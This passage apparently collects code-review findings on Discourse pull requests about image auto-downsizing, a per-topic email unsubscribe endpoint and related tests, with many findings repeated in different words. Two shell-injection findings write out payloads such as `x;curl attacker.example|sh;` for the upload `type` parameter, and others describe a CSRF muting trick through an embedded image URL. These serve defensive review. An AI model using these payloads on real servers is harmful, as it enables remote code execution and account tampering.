In the new plural branch, `obj[k].map(...)` throws a TypeError when the `_ids` value is null or not an array. Now that every `*_ids` key on a `__rest_serializer` payload is matched, that includes any non-association field that happens to end in `_ids`.

When the side-loaded collection is missing or an id is not found, the resulting array contains `undefined` entries. The original `_ids` key is deleted anyway, unlike the singular branch, which only replaces the key on success. The `|| []` is dead code because `map` always returns an array.

The net effect is that ids are lost and consumers receive arrays with holes.

title: 'find embedded' test asks for fruit 2 but asserts fruit 1's data
body:
The test calls `store.find('fruit', 2)`, but the Pretender handler for `/fruits/:id` ignores the id and always returns `fruits[0]` (apple, `color_ids: [1,2]`). Fruit 2 (banana) has `color_ids: [3]`.

The assertions that colors have length 2 with ids 1 and 2 only pass because the fake server ignores the id. The test does not verify what it appears to. Request id 1, or make the handler return the requested fruit.

title: Spec name claims behavior that no longer exists
body:
`expandable_first_post?` no longer checks for embeddable hosts at all. The spec "is false if embeddable_host is blank" now passes only because `embed_truncate` defaults to false and the unsaved topic has no embed.

Likewise, `Fabricate(:embeddable_host)` in the 'with an emeddable host' block has no effect on the outcome. The spec misleads readers about the behavior: hosts are now irrelevant to expansion. It should be renamed or rewritten to cover the actual conditions.

title: Fabricator file contents are swapped
body:
`category_fabricator.rb` now contains only the `:embeddable_host` fabricator. The new `embeddable_host_fabricator.rb` contains all the category fabricators (`:category`, `:diff_category`, `:happy_category`, `:private_category`).

This works because all fabricator files are loaded, but anyone looking for the category fabricators will look in the wrong file. Swap the contents back.

title: No tests for the new admin create/update/destroy endpoints
Second `self.downsize` silently replaces the width/height variant
body:
Ruby has no method overloading. The new `def self.downsize(from, to, dimensions, opts={})` at line 149 overwrites the `def self.downsize(from, to, max_width, max_height, opts={})` defined just above it at line 145, so the 4-dimension version is dead code.

Any existing caller that passes width and height separately now breaks:
- `downsize(path, path, max, max, allow_animation: x)` raises `ArgumentError` (5 args for 3..4).
- `downsize(path, path, w, h)` binds `h` to `opts`, and `opts[:allow_animation]` on an Integer raises `TypeError`.

This includes the existing avatar-downsizing path and any specs that call it. Give the percentage variant a distinct name (e.g. `downsize_by`), or build the dimension string at the call site and keep a single signature.

title: Animated GIF downsizing passes a percentage to gifsicle `--resize-fit`, which only accepts WxH
body:
When `allow_animated_thumbnails` is enabled and the upload is a `.gif`, `optimize` dispatches to `downsize_instructions_animated`. That reuses `resize_instructions_animated` and emits `gifsicle ... --resize-fit 80% ...`.

`--resize-fit` expects a WxH geometry, not a percentage (percent scaling would be `--scale 0.8`). The command exits non-zero, `convert_with` returns false, and the return value is ignored. The loop runs 5 no-op attempts and the oversized GIF is still rejected by the size validation.

The feature does not work for animated GIFs, and each such upload wastes 5 failed process spawns.

title: Loop condition and recorded filesize use `tempfile.size`, which reads a stale file descriptor after ImageOptim replaces the file
body:
`Tempfile#size` on an open tempfile does `fstat` on its file descriptor, not on the path. `convert_with` runs `ImageOptim.new.optimize_image!(to)`, and image_optim writes to a separate temp file and `rename`s it over the path. After the first iteration the path points to a new inode while `tempfile`'s descriptor still refers to the old, unlinked one.

So `tempfile.size` reports the size of the first `convert` output for every later iteration. Consequences:
- If that size is still above the limit, the loop always runs all 5 attempts and over-shrinks the image (about 0.8^5 linear) even after the real file is small enough.
- The stale size is passed as `filesize` to `Upload.create_for`, so a successfully shrunk image can still fail the max-size validation, or be stored with a wrong filesize.

Use `File.size(tempfile.path)` for both the loop check and the filesize argument, and make sure downstream code reads from the path rather than the old descriptor.

title: Client-side size check hardcoded to 10MB for attachments too, ignoring `max_attachment_size_kb`
body:
`validateUploadedFile` previously used `Discourse.SiteSettings['max_' + type + '_size_kb']`, which handles both images and attachments. It now uses a hardcoded 10MB for every type, even though the server only auto-downsizes images.

- If an admin set `max_attachment_size_kb` above 10MB, users can no longer upload attachments they are allowed to upload; the client rejects them with a misleading "max 10240 KB" message.
- If the setting is below 10MB, the client no longer catches oversized attachments early. The full file is uploaded only to be rejected by the server.

The 413 handler at line 246 likewise reports a fixed 10MB that has no relation to the web server's actual limit. Keep the setting-based limit for attachments (and for images when downsizing is disabled) and only relax it for images.

title: Oversized animated GIFs are silently flattened to a single frame when animated thumbnails are disabled
body:
When `allow_animated_thumbnails` is false, `downsize_instructions` runs `convert #{from}[0] ...`, which keeps only the first frame and writes it back over the uploaded file.

Previously an oversized animated GIF got a clear "file too large" error. Now it is silently stored as a static image. Users lose their animation with no indication of why.

Consider skipping auto-downsizing for animated images that cannot be resized with animation preserved, and returning the size error instead.

title: Up to 5 ImageMagick + ImageOptim passes on a 10MB image run inside the web process
body:
The new loop runs `convert` followed by a full ImageOptim pass up to 5 times on images of up to 10MB, all inside the request handling path. For API uploads with `synchronous` it runs in the request itself; otherwise it runs in `Scheduler::Defer`, a single in-process background thread shared with other deferred work.

Each iteration can take seconds of CPU on large photos, which delays all other deferred tasks in that worker. Several problems compound this:
- The `convert` exit status is ignored, so a failing conversion still costs 5 iterations.
- ImageOptim runs on every intermediate result rather than once at the end.
- The scale factor is fixed at 80% instead of being derived from the size ratio.

title: No tests for auto-downsizing or the changed `OptimizedImage` API
body:
The PR changes the signature and behaviour of `OptimizedImage.downsize`/`optimize` and removes `OptimizedImage.dimensions`. It also adds a new size-reduction path in `UploadsController#create_upload`, but no specs are added or updated.

A test that calls the existing 4-argument `downsize` would have exposed the method-redefinition bug. A controller spec that uploads an image above `max_image_size_kb` would exercise the loop and filesize handling, including the stale `tempfile.size` issue.

title: Second `self.downsize` definition silently replaces the width/height variant
body:
Ruby has no method overloading. `self.downsize(from, to, dimensions, opts={})` at line 149 redefines and replaces `self.downsize(from, to, max_width, max_height, opts={})` at line 145, so the width/height variant can never be called.

Any existing caller using the old form breaks:
- `downsize(from, to, w, h, opts)` raises `ArgumentError` (5 args for 3..4).
- `downsize(from, to, w, h)` binds `h` to `opts`, and `opts[:force_aspect_ratio]` on an Integer raises `TypeError`.

The `rescue` in `convert_with` does not cover either failure. Ruby also emits a "method redefined" warning. Give the new variant a distinct name (e.g. `downsize_by`), or have one method accept both forms.

title: Shell command injection via user-supplied `type` param in tempfile path
body:
For API uploads by URL, the tempfile comes from `FileHelper.download(url, 10.megabytes, "discourse-upload-#{type}")`. `type` is the raw `params.require(:type)`, and Tempfile embeds that prefix verbatim in the file path.

The new loop passes `tempfile.path` to `OptimizedImage.downsize`. That builds the command with `%W{convert #{from}[0] ...}` and runs it through backticks (`convert_with`), so the path is interpreted by a shell.

A `type` such as `x;curl attacker.example|sh;` therefore executes arbitrary commands as the web process user for anyone with API access. Paths must be shell-escaped (`Shellwords.escape`) or the command run with an argv array (`Open3`/`system(*args)`), and `type` should be validated against a whitelist.

title: Large SVG uploads are run through ImageMagick and mangled
body:
`FileHelper.is_image?` matches `.svg`, so any SVG over `max_image_size_kb` enters the downsize loop. There it is rasterized by `convert` and written back in place: as SVG for no-extension Rack tempfiles, or by the `.svg` extension for URL downloads. The original vector content is replaced by an ImageMagick-generated approximation.

`OptimizedImage.create_for` deliberately special-cases SVG (`FileUtils.cp` instead of resizing); this new path does not. It also needlessly feeds user-supplied SVG to ImageMagick's SVG/MSVG coders, a known attack surface. Exclude SVG (and other vector formats) from the auto-downsize.

title: Animated GIFs are either flattened to one frame or never shrunk
body:
`downsize_instructions` reads `#{from}[0]`, i.e. only the first frame. When the gifsicle branch is not taken, an oversized animated GIF is silently replaced by a static first frame before being stored as the user's original upload. That branch is skipped when `allow_animated_thumbnails` is off, or when the tempfile path has no `.gif` extension.

When the gifsicle branch is taken, `resize_instructions_animated` passes `--resize-fit 80%`. gifsicle expects `WxH` geometry, not a percentage, so the command fails every time. `convert_with` returns false, the loop burns all 5 attempts, and the upload is still rejected as too large.

The feature does not work correctly for GIFs in either case.

title: Up to 5 full convert + ImageOptim passes per upload on request/defer thread; failures not detected
body:
Each iteration runs a full ImageMagick re-encode, then `ImageOptim.new.optimize_image!` (inside `convert_with`), on a file of up to 10MB.
- For `synchronous` API uploads this blocks the request worker.
- Otherwise it runs inside `Scheduler::Defer`, which processes deferred work serially per process, so one large upload stalls all other deferred jobs.

Other problems with the loop:
- The return value of `downsize` is ignored, so a failing `convert` is retried 5 times for nothing.
- ImageOptim runs on every intermediate pass instead of once.
- JPEGs are lossily re-encoded up to 5 times, compounding quality loss.

Computing the required scale factor up front and resizing once would avoid all of this.

title: Client size check ignores `max_attachment_size_kb` and hardcodes 10MB for all file types
body:
Previously the limit was `Discourse.SiteSettings['max_' + type + '_size_kb']`, so attachments were checked against `max_attachment_size_kb`. Now every file, including non-image attachments that the server never downsizes, is checked against a hardcoded 10MB.

This has two effects:
- Sites that configured `max_attachment_size_kb` above 10MB can no longer upload attachments their admins allowed; the client blocks them with a misleading "max 10240 KB" message.
- Attachments between the configured limit and 10MB are no longer rejected client-side. They are fully uploaded and then rejected by the server.

Only images should get the raised limit; attachments should keep using `max_attachment_size_kb`.

title: 413 error message reports a hardcoded 10MB limit
body: A 413 comes from the web server/proxy (e.g. nginx `client_max_body_size`), whose limit is independent of this code. The alert now always tells users the maximum is 10240 KB, which is wrong on any deployment configured differently. The same 10MB magic number is also duplicated in three places (two in this file, one in the controller) with no shared setting.

title: No tests for auto-downsizing or the changed OptimizedImage API
Second `self.downsize` definition silently replaces the width/height variant
body:
Ruby has no method overloading. The `def self.downsize(from, to, dimensions, opts={})` at line 149 replaces the `downsize(from, to, max_width, max_height, opts={})` defined just above it.

Existing callers that pass width and height break. For example, `Upload.create_for` downsizes profile_background and card_background images with `OptimizedImage.downsize(file.path, file.path, width, height, allow_animation: ...)`:
- With 5 arguments the call raises `ArgumentError` (wrong number of arguments).
- With 4 positional arguments, `opts` becomes an Integer and `opts[:allow_animation]` raises `TypeError`.

Profile and card background uploads will fail. Give the percentage/geometry variant a distinct name (e.g. `downsize_to(dimensions)`), or have a single method accept either form.

title: User-controlled `type` reaches a shell command via the tempfile path
body:
For API URL uploads, the tempfile comes from `FileHelper.download(url, 10.megabytes, "discourse-upload-#{type}")`. `type` is the unvalidated `params.require(:type)`, so the tempfile path contains it verbatim; Tempfile only strips path separators.

This PR now passes `tempfile.path` to `OptimizedImage.downsize` for any type whenever the image exceeds `max_image_size_kb`. `convert_with` runs `instructions.join(" ")` through backticks with no escaping. A `type` such as `x;$(curl evil|sh);` therefore executes arbitrary shell commands on the server. The attacker only needs an API key and a URL pointing to a large `.png`.

Fix both sides:
- Whitelist `type`.
- Build the command without the shell (`Open3`/`system` with an argv array, or `Shellwords.escape` on each element).

title: Large animated GIFs are flattened or not downsized; conversion failures are ignored
body:
The behavior depends on `allow_animated_thumbnails`:
- **Disabled:** `downsize_instructions` uses `#{from}[0]`, so an oversized animated GIF is silently replaced by its first frame. The animation is lost without telling the user.
- **Enabled:** the call goes to `resize_instructions_animated`, which runs `gifsicle --resize-fit 80%`. gifsicle's `--resize-fit` expects WxH, not a percentage, so the command fails.

The boolean returned by `downsize` is ignored either way. The loop spends all 5 attempts re-running a failing command, then hands an oversized file to `Upload.create_for`.

Check the return value and break on failure. Compute an explicit WxH target for gifsicle, and keep animated images animated.

title: SVG uploads are run through ImageMagick raster resize
body:
`FileHelper.is_image?` accepts `.svg`, so an SVG larger than `max_image_size_kb` is fed to `convert ... -resize 80%> file.svg`. That rasterizes the vector image and writes it back to the `.svg` path, either failing or producing a bloated or corrupted file.

`OptimizedImage.create_for` deliberately special-cases SVG and copies it instead of resizing. This new path should skip SVGs the same way.

title: Up to 5 synchronous ImageMagick passes on unbounded input in the request/defer thread
body:
Every oversized image now goes through up to 5 full decode/resize/encode cycles plus ImageOptim, before the server applies any size check.

- For multipart uploads, the only 10MB cap is client-side JS, so a crafted request can send anything up to the web server's body limit.
- A small compressed image with huge pixel dimensions (decompression bomb) can use a lot of memory and CPU in each pass.
- The work runs either in the request thread (synchronous API) or in `Scheduler::Defer`, a single in-process queue, so a few large uploads stall all other deferred work in that process.

Repeated 80% lossy re-encodes also degrade JPEG quality cumulatively.

Enforce a server-side byte and pixel limit before converting. Compute the needed scale once (one pass), and consider moving the work to a background job.

title: `tempfile.size` may be stale after the file is rewritten by path
body:
`convert` and `ImageOptim.optimize_image!` rewrite the file by path. ImageOptim replaces the file by renaming a new temp file over the original, which creates a new inode.

The `Tempfile` object keeps its open descriptor on the old inode, so `Tempfile#size` (fstat on that fd) can report the pre-optimization size. The stale size has two effects:
- It drives the loop condition, which can trigger extra unnecessary downsizes.
- It is passed as `filesize` to `Upload.create_for`, which can store a wrong size or reject an image that now fits.

Use `File.size(tempfile.path)` after each conversion, or reopen the file.

title: Client size limit hardcoded to 10MB, ignoring the max_attachment_size_kb / max_image_size_kb settings
body:
`validateUploadedFile` previously used `max_<type>_size_kb`. It now uses a fixed `10 * 1024` for both images and attachments. Two regressions follow:
- Sites that set `max_attachment_size_kb` or `max_image_size_kb` above 10MB can no longer upload such files; the client blocks them.
- Attachments are never downsized, but now pass the client check whenever they are under 10MB and above the configured limit. They upload fully and are then rejected by the server with a less helpful error.

Keep using `max_attachment_size_kb` for attachments, and only relax the limit for images.

The 413 handler (line 246) likewise now always reports 10MB, even though a 413 comes from the web server's body limit, which is unrelated to this constant.

title: No tests for auto-downsizing or the changed `downsize` signature
body:
The PR changes the `optimize`/`downsize` signatures and adds a downsizing loop in `UploadsController#create_upload`, but adds no specs. A spec calling `OptimizedImage.downsize` with width and height would have caught the method-override bug immediately.

Add coverage for:
- Both `downsize` call forms.
- The controller loop: oversized image is reduced, conversion failure, animated GIF, SVG.

title: State-changing unsubscribe exposed over GET (CSRF / embedded-image muting)
body: `unsubscribe` changes the user's notification level, but it is routed as a plain GET (`get "t/:slug/:topic_id/unsubscribe"`) with no token or confirmation, and `check_xhr` is skipped. Any page or forum post the logged-in user's browser loads can trigger it, for example a post containing `![](/t/foo/123/unsubscribe)`. Every viewer is then silently demoted on topic 123, and after a second load they are muted. The `TopicUser` update runs before `respond_to`, so it is saved even when the request is an image fetch. Existing mutations such as `mute`/`unmute`/`set_notifications` use PUT/POST. Fix: make the mutation a POST from the Ember page, or require a signed per-user key in the URL.

title: NoMethodError when the user has no TopicUser row
body: `TopicUser.find_by(user_id:, topic_id:)` returns nil when the logged-in user has never interacted with the topic. Examples: a forwarded link, a guessed URL, or the embedded-image case. The next line, `tu.notification_level`, then raises and the request returns a 500. Use `TopicUser.change`, which creates the row if missing, or handle nil explicitly.

title: Direct `tu.save!` bypasses TopicUser.change, so the unsubscribe can be silently reverted
body:
Assigning `notification_level` and calling `save!` skips what `TopicUser.change` does: setting `notifications_reason_id = user_changed` and `notifications_changed_at`, and publishing the MessageBus `notification_level_change`.

Users who were auto-tracked through `update_last_read` have `notifications_reason_id` NULL. For them, both `update_last_read` (`case when tu.notifications_reason_id is null and ... then :tracking`) and `TopicUser.auto_track` will bump the level back to tracking on the next read or post, undoing the unsubscribe.

Other open tabs also never learn about the change because nothing is published on MessageBus. Use `TopicUser.change(current_user.id, topic_id, notification_level: ...)`.

title: Toggle logic does not stop the emails it promises to stop, and repeat visits escalate to muted
body:
If the level is above regular it drops only to regular; otherwise it mutes.

Reply, mention and quote emails are also sent at the regular level. A tracking user who clicks the link in a 'replied' email ends up at regular and keeps receiving exactly those emails. Meanwhile the page tells them 'You will stop receiving notifications for <title>'.

The action is also not idempotent. Refreshing the page, a browser prefetch, or clicking a second email link moves the user one more step down, from regular to muted. The intended target level should be explicit, for example always muted, or at least below the level that triggers the email type that was clicked.

title: Explicit `render :show` happens before `show` sets canonical_url, dropping the topic canonical link
body:
`perform_show_response` now calls `render :show` inside `format.html`. Rails renders the template and layout immediately at that call.

In `show`, `canonical_url UrlHelper.absolute_without_cdn(...)` runs afterwards (line 87). Previously the implicit render happened at the end of the action, so `@canonical_url` was already set. Now the layout's canonical link tag is rendered without it and falls back to the request path. Post-number URLs like `/t/slug/123/45` then advertise themselves as canonical, which is an SEO and duplicate-content regression. Move the `canonical_url` call before `perform_show_response`, or set it inside it.

title: Client-side transition to the unsubscribe route shows the confirmation without unsubscribing
body:
The route's model hook calls `PostStream.loadTopicView(params.id)`. That uses the preloaded `topic_<id>` payload, or otherwise fetches `/t/<id>.json`; it never hits `/t/:slug/:id/unsubscribe`.

Only a full page load reaches `TopicsController#unsubscribe`. If the user reaches this route through in-app navigation, or once the preload has been consumed, the page claims 'You will stop receiving notifications' but no server-side change is made.

title: Logged-out users clicking the email link lose the unsubscribe intent
body: `unsubscribe` was added to `ensure_logged_in`. Many recipients click email links on a device where they are not logged in. For a non-XHR GET, the NotLoggedIn handling sends them to the homepage, with no return-to path and no message. The unsubscribe silently does not happen, and the user has no indication they need to log in and retry.

title: add_unsubscribe_link now implicitly requires unsubscribe_url
body:
The `unsubscribe_link` translation now interpolates `%{unsubscribe_url}`. Any caller (core or plugin) that passes `add_unsubscribe_link: true` without `unsubscribe_url` will hit `I18n::MissingInterpolationArgument` in both `body` (line 90) and `html_part`. The spec had to be changed to pass a dummy URL for this reason.

The text 'stop receiving notifications about this particular topic' also only makes sense for topic emails. Consider a separate translation key, appended only when `unsubscribe_url` is present.

title: No tests for the new unsubscribe endpoint or for the per-topic link in emails
body:
The only spec change passes a dummy `unsubscribe_url` so the existing test does not crash. Nothing asserts that the URL actually appears in the body or HTML part.

There are no controller specs for `TopicsController#unsubscribe`, covering:
- the level transitions (watching/tracking to regular, regular to muted),
- the slug redirect,
- the missing-TopicUser case,
- the logged-out case.

Those are where the bugs above live.

title: Explicit `render :show` runs before `canonical_url` is set, breaking canonical links on topic pages
body:
`perform_show_response` now calls `render :show` inside the `format.html` block, so the page and layout render immediately. In `show`, `canonical_url ...` is called afterwards (line 87). Previously the implicit render ran at the end of the action, after `@canonical_url` was set.

Now the layout's canonical link tag sees no `@canonical_url` and falls back to the default (the raw request URL). Every topic HTML page loses its proper `<link rel="canonical">`. For example, `/t/slug/123/45` becomes its own canonical instead of the topic's canonical path. This is an SEO regression affecting all topic views.

Fix: move the `canonical_url` call above `perform_show_response`, or render `:show` explicitly only in `unsubscribe`.

title: NoMethodError when user has no TopicUser row for the topic
body:
`TopicUser.find_by(user_id:, topic_id:)` returns nil when the user has never had a topic_users record for this topic. A logged-in user can hit `/t/slug/:id/unsubscribe` for any visible topic, or a row may have been removed. The next line, `tu.notification_level > ...`, then raises NoMethodError and returns a 500.

Fix: handle the nil case, e.g. by using `TopicUser.change` to create or update the row.

title: Saving TopicUser directly leaves notifications_reason_id nil, so auto-tracking silently undoes the unsubscribe
body:
The action sets `notification_level` and calls `tu.save!`, bypassing `TopicUser.change`. `change` would also set `notifications_reason_id = user_changed`, set `notifications_changed_at`, and publish the MessageBus `notification_level_change`.

Because the reason stays NULL, the SQL in `TopicUser.update_last_read` will overwrite the level with `tracking` the next time the user reads the topic past the auto-track threshold. That SQL runs `case when tu.notifications_reason_id is null and total_msecs_viewed > threshold then :tracking`. `auto_track` also only acts on rows with a nil reason. Users who were auto-tracked by reading, which is the common case, therefore get re-subscribed as soon as they open the topic again. Open browser tabs also never learn about the level change.

Fix: use `TopicUser.change(current_user, topic_id, notification_level: ...)`.

title: Non-idempotent state-changing GET; first click doesn't actually stop notifications
body:
The unsubscribe link is a GET that toggles state. If the level is above regular it drops to regular; otherwise it mutes.

Two consequences:
1. Email link scanners and prefetchers (e.g. Outlook Safe Links, corporate gateways) or a second click will step the user further, from watching/tracking to regular and then to muted, without the user's intent.
2. A tracking or watching user who receives a reply/mention/quote email and clicks "stop receiving notifications about this particular topic" is only set to `regular`. Regular still receives reply, mention and quote notifications and emails. Yet both the email text and the page ("You will stop receiving notifications for ...") claim notifications have stopped.

The action should set an explicit target level (e.g. muted) idempotently, or the copy should match the behavior.

title: Unsubscribe link from email requires an active session
body: `:unsubscribe` was added to `ensure_logged_in`. Users frequently click email links in a browser or client where they are not logged in. They will get the NotLoggedIn handling (redirect to `/` or a 403) and the unsubscribe never happens. The intended URL is not preserved for after login, so the user lands somewhere unrelated with no explanation. Consider storing the destination and redirecting to login.

title: unsubscribe_link translation now requires unsubscribe_url for every add_unsubscribe_link caller
body:
The `unsubscribe_link` string in server.en.yml now interpolates `%{unsubscribe_url}`, and it is rendered in both `html_part` (line 67) and `body` (line 90) whenever `add_unsubscribe_link` is true.

Any caller that passes `add_unsubscribe_link: true` without `unsubscribe_url` will raise `I18n::MissingInterpolationArgument` when building the email. Such callers include other mailers or plugins, and any non-topic email. The existing spec had to be modified to pass `unsubscribe_url` for exactly this reason.

Fix: make the per-topic sentence conditional (separate key appended only when `unsubscribe_url` is present), or default the argument.

title: Overriding computed `details.notificationReasonText` leaks into the identity-mapped topic
body:
`store.createRecord('topic', { id })` with an id hydrates through the store's identity map. The topic route later reuses the same Topic and TopicDetails instance when the user navigates to `/t/slug/id`.

Setting `details.notificationReasonText` to null overrides the computed property on that object. After visiting the unsubscribe page and then opening the topic in the same session, the notification reason text stays blank and no longer updates when the level changes.

Fix: hide the text in this template or view instead of mutating the shared model.

title: In-app navigation to the unsubscribe URL shows confirmation without changing anything
body:
The client route `topicUnsubscribe` only loads the topic via `PostStream.loadTopicView`, which hits `/t/:id.json`. It never calls the server `unsubscribe` action. The state change happens only on a full page load.

If the URL is followed inside the running Ember app, the page says "You will stop receiving notifications" but the notification level is untouched. Discourse intercepts same-origin links, so this happens with a link pasted in a post or reached through browser history.

title: No tests for the new unsubscribe behavior
Explicit `render :show` in perform_show_response drops the canonical URL from topic pages
body:
`perform_show_response` previously had no explicit render in `format.html`, so Rails rendered `show` implicitly after the action returned. `TopicsController#show` relied on that: it calls `canonical_url ...` (line 87) after `perform_show_response` (line 85).

The new `render :show` renders the template immediately inside `perform_show_response`. By the time `canonical_url` sets `@canonical_url`, the layout has already been rendered without it. Every HTML topic page therefore loses its `<link rel=canonical>` tag, which is an SEO regression and can cause duplicate-content indexing of `/t/slug/id/N` variants.

Fix: move the `canonical_url` call before `perform_show_response` in `show`.

title: NoMethodError when the user has no TopicUser row for the topic
body:
`TopicUser.find_by(user_id: current_user.id, topic_id: params[:topic_id])` returns nil when the logged-in user has never interacted with the topic. Line 107 then calls `tu.notification_level` on nil and the request fails with a 500.

This happens to any logged-in user who opens the unsubscribe URL of a topic they have no record for, for example a forwarded email or a link shared by someone else.

Fix: use `TopicUser.change(...)`, which upserts the row, or handle the nil case explicitly.

title: Mute set via `tu.save!` bypasses TopicUser.change, so it can be silently reverted by auto-tracking
body:
The level is changed by assigning `notification_level` and calling `save!` directly instead of `TopicUser.change`. As a result:
- `notifications_reason_id` is not set to `user_changed`.
- `notifications_changed_at` is not updated.
- No MessageBus `notification_level_change` is published, so other open tabs do not update.

The missing reason id matters. `TopicUser.update_last_read` bumps the level to `tracking` when `tu.notifications_reason_id IS NULL` and read time exceeds the auto-track threshold. `TopicUser.auto_track` also only acts when the reason is nil. A user whose row had a null reason (e.g. one created only to store `last_emailed_post_number`) who unsubscribes and later reads the topic is silently moved from muted back to tracking.

Fix: use `TopicUser.change(current_user.id, topic_id, notification_level: ...)`.

title: State-changing GET endpoint is CSRF-able and degrades further on every repeat visit
body: `unsubscribe` changes the user's notification level on a plain GET with no token. Any third-party page can embed `` and the victim's session cookie will mute or downgrade arbitrary topics for them. The action is also not idempotent. Each hit lowers the level once more: - watching → regular on the first visit, - regular → muted on the next. A double click, a page reload, a back-navigation, or revisiting the email link therefore mutes a topic the user only meant to downgrade. Fix: require a POST (or a signed per-user token in the link) and set a deterministic target level.

title: Watching/tracking users are only moved to regular, yet the page says notifications will stop
body:
If the current level is above regular (tracking or watching), the action sets it to `regular`. A regular-level user still receives reply, mention and quote notifications and emails, and those are exactly the emails that carry this link (`user_replied`, `user_mentioned`, `user_quoted`).

For a tracking user who got a reply email, nothing effectively changes. The page still tells them "You will stop receiving notifications for <topic>" (`topic.unsubscribe.stop_notifications`), which is misleading.

Fix: either mute directly, or make the confirmation text reflect the level that was actually set.

title: Logged-out users clicking the email link are bounced without unsubscribing or returning after login
body:
`unsubscribe` is added to `ensure_logged_in`. For a non-XHR GET, the NotLoggedIn handler redirects to the home page. Email recipients are frequently not logged in on the browser that opens the link.

For them the "click here" link silently does nothing: no unsubscribe happens, no message is shown, and they are not returned to the unsubscribe URL after logging in. The advertised one-click unsubscribe does not work for this common case.

title: `unsubscribe_link` translation now requires `unsubscribe_url` for every add_unsubscribe_link caller
body:
`server.en.yml`'s `unsubscribe_link` now interpolates `%{unsubscribe_url}`. Missing interpolation arguments raise `I18n::MissingInterpolationArgument`.

Any `Email::MessageBuilder` user that passes `add_unsubscribe_link: true` without `unsubscribe_url` will now raise in both `body` and `html_part`. Examples are plugins, other mailers, or non-topic emails. The existing spec had to be modified to pass `unsubscribe_url`, which demonstrates the break.

Fix: only render the per-topic sentence when `unsubscribe_url` is present, or split it into a separate translation key.

title: Setting computed `details.notificationReasonText` to null clobbers it on the shared topic instance
body:
`this.store.createRecord("topic", { id })` returns the identity-mapped topic instance, the same one used by the topic route. `notificationReasonText` on TopicDetails is a getter-only computed property, and `set`-ing it overrides the computed property permanently on that object.

After visiting the unsubscribe page, client-side navigation to the topic shows no notification reason text under the notifications button. The text also no longer updates when the level changes, until a full page reload.

Fix: hide the text via a component or template flag instead of mutating the model.

title: Client-side transition to the unsubscribe route never actually unsubscribes
body:
The Ember route's model hook only loads the topic via `PostStream.loadTopicView` and never calls the server `unsubscribe` action. The mute happens only on a full server page load.

If the URL is reached through an in-app transition, for example a link inside a post that Discourse intercepts and routes client-side, the page still says "You will stop receiving notifications" while the level is unchanged.

title: No tests for the new unsubscribe action or the per-topic link content
body:
The only spec change passes `unsubscribe_url` so the existing test does not crash. No test asserts that the per-topic unsubscribe URL appears in the body or HTML part.

There are no controller specs for `TopicsController#unsubscribe` covering:
- the level transitions,
- a missing TopicUser,
- the slug redirect,
- anonymous access.

No test covers `Topic#unsubscribe_url` either. The nil-TopicUser crash and the reason-id issue would have been caught by basic controller specs.

title: Match statistics are written inside validation, so they get double-counted or rolled back
body:
`BlockedEmail.should_block?` increments `match_count` and saves the row. It is called from `EmailValidator#validate_each`, so it runs on every validation pass. The counts end up wrong in two ways.
